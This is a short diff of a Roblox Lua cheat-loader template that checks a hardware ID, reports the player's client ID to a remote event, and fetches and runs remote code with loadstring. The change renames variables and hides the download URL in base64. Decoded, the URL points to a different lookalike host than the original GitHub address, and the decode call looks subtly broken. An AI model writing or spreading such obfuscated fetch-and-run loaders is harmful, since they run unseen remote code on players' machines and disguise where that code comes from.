@@ -1,10 +1,14 @@
-Script_key = "{key}"
-script_hwid = "{hwid}"
+_Sk = "{key}"
+_Hw = "{hwid}"
 
-if script_hwid == "{hwid}" then
-    local client_id = game:GetService("RbxAnalyticsService"):GetClientId()
-    game:GetService("ReplicatedStorage").ClientIdDetected:Fire(client_id, "{key}", "{interaction.user.name}")
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/SHADOWCCISGOOD/FF2/refs/heads/main/shadowcc/NEW%20UI/BETTER%20THAN%20EVER/shadowcc"))()
+if _Hw == "{hwid}" then
+    local _CId = game:GetService("RbxAnalyticsService"):GetClientId()
+    game:GetService("ReplicatedStorage").ClientIdDetected:Fire(_CId, _Sk, "{interaction.user.name}")
+    
+    -- Base64 encoded URL
+    local encodedUrl = "aHR0cHM6Ly9yYXdnaXRlLmNvbS9TSEFET1dDQ0lTR09PREYvZmYyL3JlZnMvaGVhZHMvbWFpbi9zaGFkb3djYy9OZXdVSS9CRVRURVJfVEhBUl9FVkVSL3NoYWRvd2Nj"
+    local decodedUrl = game:GetService("HttpService"):DecodeBase64(encodedUrl)
+    loadstring(game:HttpGet(decodedUrl))()
 else
     print("HWID mismatch! This script cannot be executed on this device.")
 end
